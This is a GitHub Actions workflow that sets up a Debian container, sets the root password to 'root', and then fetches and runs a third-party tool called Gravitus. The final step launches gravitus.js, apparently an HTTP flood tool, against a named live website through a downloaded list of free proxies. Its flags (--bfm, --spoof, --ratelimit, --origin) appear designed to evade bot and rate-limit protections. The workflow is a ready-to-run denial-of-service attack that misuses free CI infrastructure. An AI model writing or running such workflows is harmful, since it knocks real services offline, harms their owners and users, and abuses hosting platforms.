name: Debian 11 Commands

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  commands:
    runs-on: ubuntu-latest
    container:
      image: debian:11
      options: >-
        --ulimit core=-1
        --ulimit memlock=-1:-1
        --ulimit nofile=1048576:1048576

    steps:
      - name: Initialize Debian as root
        shell: bash
        run: |
          set -euo pipefail

          apt-get update
          apt-get install --no-install-recommends -y bash passwd ca-certificates git
          apt-get install --no-install-recommends -y bash passwd ca-certificates wget
          apt-get install --no-install-recommends -y bash passwd ca-certificates python3
          apt-get install --no-install-recommends -y bash passwd ca-certificates pip

          # The container already runs as root. Set the requested password.
          printf '%s\n' 'root:root' | chpasswd

      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Run 8 commands with raised limits
        shell: bash
        run: |
          set -euo pipefail

          # Keep these in the same step so the limits apply to all 8 commands.
          ulimit -c unlimited
          ulimit -l unlimited
          ulimit -s unlimited
          ulimit -n 1048576

          echo "User: $(id -un)"
          echo "Debian: $(cat /etc/debian_version)"
          ulimit -a

          # Write your 8 commands below.
           git clone https://github.com/iamthebestm85/Gravitus.git
           cd Gravitus
           wget -O proxy.txt "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=100&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
           python3 install.py
           node gravitus.js https://panel.datacasa.com.tr/ 60000 30 10 proxy.txt --bfm --cache --spoof --ratelimit --origin
